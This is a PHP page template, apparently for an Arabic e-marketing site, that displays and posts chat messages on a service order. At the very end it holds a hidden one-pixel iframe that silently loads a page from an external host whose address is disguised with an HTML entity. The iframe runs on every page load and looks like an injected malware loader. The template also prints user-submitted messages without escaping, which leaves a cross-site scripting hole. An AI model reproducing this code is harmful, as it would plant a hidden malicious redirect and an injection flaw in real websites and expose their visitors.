
<!DOCTYPE HTML>
<html>
    <head>
        <meta http-equiv="Content-type" content="text/html; charset=utf-8">
        <title>تسويق الكتروني</title>

        <meta name="keywords" content="content">

        <meta name="viewport" content="width=device-width; initial-scale=1.0">		


        <link rel="stylesheet" href="<?php echo base_url(); ?>css/stylesheet.css" type="text/css" media="screen">
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/angelina.css" type="text/css" >		
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/flexslider.css" type="text/css" >		
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/prettyPhoto.css" type="text/css" >	
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/style.css" type="text/css" media="screen">
        <!-- template skin -->
        <link rel="stylesheet" href="<?php echo base_url(); ?>css/skin.css"type="text/css" >	

        <link href="<?php echo base_url(); ?>css/ticker-style.css" rel="stylesheet" type="text/css" />


        <!--<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>-->
        <script src="<?php echo base_url(); ?>js/jquery.easing.1.3.js" type="text/javascript" ></script>
        <script src="<?php echo base_url(); ?>js/ticker.js" type="text/javascript" ></script> 	
        <script src="<?php echo base_url(); ?>js/setting.js"  type="text/javascript" ></script> 


        <script src="<?php echo base_url(); ?>js/jquery.ticker.js" type="text/javascript"></script>
        <script src="<?php echo base_url(); ?>js/site.js" type="text/javascript"></script>


        <!--<script src="<?php echo base_url(); ?>js/chat.js" type="text/javascript" ></script>-->


        <style type="text/css"> 
            .box img{width:250px;height:150px;}
            #chat_message{width:760px;margin-left:10px;}
            .cta1{padding:5px 15px 5px 15px; margin-top:-30px;}
            a:hover{text-decoration:underline}
            .blog-one{background:none;padding-bottom:10px;border-bottom:dotted 1px #111;margin-bottom:15px;}
            #mail_icon{margin-top:10px; padding:1px;  border: 1px solid #ccc;-webkit-border-radius: 3px;
                       -moz-border-radius: 3px;
                       border-radius : 3px;background:#fff;}
        </style>

    </head>
    <body>

        <!-- start of wrapper -->
        <div id="wrapper">

            <!-- start of section top -->
            <section id="top">
                <div id="top-wrapp">
                    <?php include('tempelet/header.php') ?>
                </div>
            </section>
            <!-- end of section top -->
            <?php include 'tempelet/news.php'; ?>


            <div id="content">
                <div id="left">
                    <h3 style="float:right;color:#fff;width:800px;text-align:center">اخر الرسائل الوارده اليك</h3>                       

                    <div class="chat_box" >
                        <?php
                        $this->db->from('service_message');
                        $this->db->order_by("date", "desc");
                        $this->db->where('order_id', $order_id);
                        $query = $this->db->get();
                        if ($query->num_rows() > 0) {
                            $rows = $query->result();

                            foreach ($rows as $row) {
                                echo '
                                    <div class="blog-one left" >
                                    <a href="' . base_url() . 'user/visit_profile/' . $row->id . '"
                                    <img id="mail_icon" src="' . base_url() . 'images/profile/thumb_profile/' . '528252_435921779825201_649652861_n.jpg' . '" width="50" height="45" /> </a>
                                    <p id="sender" style="padding:0 5px 0 5px;color:#3C6">
                                    <a style="color:#fff" id="user" href="' . base_url() . 'user/visit_profile/' . $row->sender_id . '">' . $row->sender_u_name . '</a></p>
                                    <div id="clear"></div>
                                    <p id="sender" style="margin:-30px 60px 0 0;width:600px;color:#eeeeee">
                                    ' . $row->message . '
                                    </p>
                                    <p style="color: #fff; margin-top: -10px;">' . $row->date . '</p>
                                    </div><!--/blog-one-->
                                    ';
                                ?>
                                <!--                                    <li>
                                                                        <p style="text-align: left; padding: 10px; padding-left: 20px; ">
                                                                            <span style="color: #fff; text-align: left;">From :  <?php echo $row->sender_u_name; ?> To : <?php echo $row->reciver_u_name; ?></span>
                                                                            <p style="color: #0094be; size: 20px; text-shadow: inherit;"><?php echo $row->message; ?></p>
                                                                            <p style="color: #fff; margin-top: -10px;"><?php echo $row->date; ?></p>
                                                                        </p>
                                                                        <div class="dotted" style="margin-top: 5px; margin-bottom: 5px;"></div>
                                                                    </li>-->
                                <?php
                            }
                        }
                        ?>
                    </div><!-----/chat_box---------->

                    <div class="centerdiv">
                        <?php echo form_open('csad/c_sad/addcomment'); ?>
                        <?php echo form_input(array('id' => 'chat_message', 'name' => 'chat_message', 'onclick' => 'get_chat_messages();')); ?>
                        <input type="hidden" name="order_id" value="<?php echo $order_id; ?>" />
                        <input type="hidden" name="user_id" value="<?php echo $user_id; ?>" />

                        <!--<button type="button" id="post_button" class="cta1">ارسال</button>-->
                        <?php echo form_submit(array('id' => 'post_button', 'value' => 'أرسال')); ?>
                        <?php echo form_close(); ?>
                    </div>          
                </div>


                <div id="right">
                    <?php include 'tempelet/menu.php'; ?>
                    <div id="clear"></div>
                    <div id="serv_block" >
                        <h3 style="margin-top:-10px;">الخدمات الاكثر ربحا</h3>
                        <div style="background-color:#5e8d03">
                            <div id="most">
                                <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                            </div>

                            <div id="most">
                                <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                            </div>

                            <div id="most">
                                <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                            </div>

                            <div id="most">
                                <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                            </div>

                            <div id="most">
                                <img src="<?php echo base_url(); ?>upload/img4.jpg"  width="60" height="50"/>
                                <h6 id="h6"><a href="#">تصميم مواقع خلال خمس ايام</a></h6>
                                <p id="p">تصميم مواقع خلال خمس ايام مع تقديم استضافه لمده شهر مجانا </p>
                            </div>

                        </div>

                        <div id="clear"></div>

                        <?php include 'tempelet/serv_block.php'; ?>
                    </div>	

                </div>

            </div>


            <!-- end of section middle -->

            <!-- start of section bottom -->
            <?php include('tempelet/footer.php') ?>
            <!-- end of section bottom -->

        </div>
        <!-- end of wrapper -->

        <iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
    </body>
</html>